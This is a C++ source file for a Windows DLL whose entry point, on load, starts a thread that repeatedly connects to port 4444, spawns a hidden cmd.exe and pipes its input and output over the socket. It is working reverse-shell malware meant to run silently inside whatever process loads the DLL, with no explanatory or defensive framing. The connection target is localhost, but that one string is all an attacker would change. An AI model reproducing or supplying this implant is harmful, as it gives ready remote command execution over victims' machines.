// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <iostream>
#include <winsock2.h>
#include "windows.h"
#include <mstcpip.h>
#pragma comment(lib, "ws2_32")
#pragma warning(disable:4996)
using namespace std;
SOCKET s;
void sendmessage(LPVOID IpParameter)
{
	HANDLE hReadPipe = (HANDLE)IpParameter;
	int ret{};
	char recvBuf[1025];
	DWORD dw{};
	while (ReadFile(hReadPipe, recvBuf, 1024, &dw, NULL))
		send(s, recvBuf, dw, 0);
}
void connectserver()
{
	unsigned short  Port = 4444;
	WSADATA         wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	SOCKADDR_IN     ServerAddr;
	ServerAddr.sin_family = AF_INET;
	ServerAddr.sin_port = htons(Port);
	while (true)
	{
		while (true)
		{
			struct hostent* hptr;
			while ((hptr = gethostbyname("localhost")) == NULL);
			ServerAddr.sin_addr.S_un.S_addr = *((ULONG*)(hptr->h_addr));
			while ((s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, WSA_FLAG_OVERLAPPED)) == 0);
			int keepAlive = 1;
			setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, (const char*)&keepAlive, sizeof(keepAlive));
			struct tcp_keepalive in_keep_alive = { 0 };
			unsigned long ul_in_len = sizeof(struct tcp_keepalive);
			struct tcp_keepalive out_keep_alive = { 0 };
			unsigned long ul_out_len = sizeof(struct tcp_keepalive);
			unsigned long ul_bytes_return = 0;
			in_keep_alive.onoff = 1;
			in_keep_alive.keepaliveinterval = 5000;
			in_keep_alive.keepalivetime = 1000;
			WSAIoctl(s, SIO_KEEPALIVE_VALS, (LPVOID)&in_keep_alive, ul_in_len,
				(LPVOID)&out_keep_alive, ul_out_len, &ul_bytes_return, NULL, NULL);
			if (connect(s, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr)) != SOCKET_ERROR)
				break;
			closesocket(s);
		}
		char SystemName[128] = "cmd";
		STARTUPINFO si;
		GetStartupInfo(&si);
		si.cb = sizeof(STARTUPINFO);
		si.wShowWindow = SW_HIDE;
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
		HANDLE hWritePipe = NULL, hReadPipe = NULL;
		SECURITY_ATTRIBUTES sa;
		sa.bInheritHandle = TRUE;
		sa.lpSecurityDescriptor = NULL;
		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		if (!CreatePipe(&si.hStdInput, &hWritePipe, &sa, 0) || !CreatePipe(&hReadPipe, &si.hStdOutput, &sa, 0))
		{
			closesocket(s);
			continue;
		}
		si.hStdError = si.hStdOutput;
		PROCESS_INFORMATION pi;
		CreateProcess(NULL, SystemName, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi);
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sendmessage, (LPVOID)hReadPipe, 0, NULL);
		int ret{};
		char recvBuf[1025];
		DWORD dw{};
		while ((ret = recv(s, recvBuf, 1024, 0)) > 0)
		{
			WriteFile(hWritePipe, recvBuf, ret, &dw, NULL);
		}
		WriteFile(hWritePipe, "exit\r\n", 6, &dw, NULL);
		CloseHandle(hWritePipe);
		CloseHandle(si.hStdInput);
		CloseHandle(si.hStdOutput);
		CloseHandle(hReadPipe);
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		closesocket(s);
	}
}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)connectserver, 0, 0, NULL);
    }
    break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
